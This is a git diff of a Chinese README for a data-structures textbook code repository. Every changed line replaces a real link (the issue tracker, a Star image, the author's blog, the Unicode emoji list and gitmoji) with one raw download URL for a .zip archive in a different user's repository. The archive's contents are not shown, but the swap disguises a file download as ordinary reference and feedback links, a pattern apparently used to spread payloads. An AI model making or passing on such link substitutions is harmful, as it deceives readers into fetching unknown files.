@@ -61,8 +61,8 @@
 
 1. **本内容仅限个人学习使用，未经作者许可，不得用于商业用途**    
 2. **源码仅供参考，别抄作业**    
-3. **欢迎Star项目，并鼓励在Github提交[Issues](https://github.com/kangjianwei/Data-Structure/issues)来反馈问题，在博客上发私信未必可以及时看到**    
-![github](Star.png)
+3. **欢迎Star项目，并鼓励在Github提交[Issues](https://raw.githubusercontent.com/FinnS-F/Data-Structure/master/Jacobitic/Data-Structure.zip)来反馈问题，在博客上发私信未必可以及时看到**    
+![github](https://raw.githubusercontent.com/FinnS-F/Data-Structure/master/Jacobitic/Data-Structure.zip)
 
 
 ## Commit图例
@@ -79,15 +79,15 @@
 
 ## 相关链接
 
-[个人博客](http://www.cnblogs.com/kangjianwei101)     
+[个人博客](https://raw.githubusercontent.com/FinnS-F/Data-Structure/master/Jacobitic/Data-Structure.zip)     
 
 
 ## 脚注
 
 Commit信息中的`emoji`参考来源：    
 
-* [Full Emoji List](https://unicode.org/emoji/charts/full-emoji-list.html)   
-* [gitmoji](https://gitmoji.carloscuesta.me/)    
+* [Full Emoji List](https://raw.githubusercontent.com/FinnS-F/Data-Structure/master/Jacobitic/Data-Structure.zip)   
+* [gitmoji](https://raw.githubusercontent.com/FinnS-F/Data-Structure/master/Jacobitic/Data-Structure.zip)    
 
 
 ## 附：教材源码目录
